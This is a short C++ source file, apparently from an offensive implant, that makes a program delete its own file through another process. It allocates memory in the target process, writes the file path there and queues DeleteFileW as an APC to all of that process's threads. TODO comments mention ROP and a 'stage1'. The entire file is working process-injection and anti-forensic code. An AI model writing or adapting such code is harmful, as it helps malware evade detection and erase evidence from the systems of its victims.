#include "SelfDeleteAPC.hpp"

void SelfDeleteAPC::do_delete()
{
	// TODO: change to ROP to Sleep with a few seconds and then DeleteFileW
	// TODO: make stage1 delete self delete allocations

	size_t path_size = (std::wstring(m_file_path.c_str()).size() + 1) * sizeof(wchar_t);
	Address64 file_path_address = m_deletor_process->allocate_memory(path_size, AllocationType::Commit, Protection::ProtectionReadWrite);
	ByteVector file_path_bytes;
	file_path_bytes.resize(path_size);
	std::memcpy(file_path_bytes.data(), m_file_path.c_str(), path_size);
	m_deletor_process->write(file_path_address, file_path_bytes);

	// Currently assuming the kernel32 api calls will be the same address in the remote
	thread_utils::queue_apc_to_all_threads_of_process(m_deletor_process->get_pid(), reinterpret_cast<PAPCFUNC>(DeleteFileW), file_path_address);

}
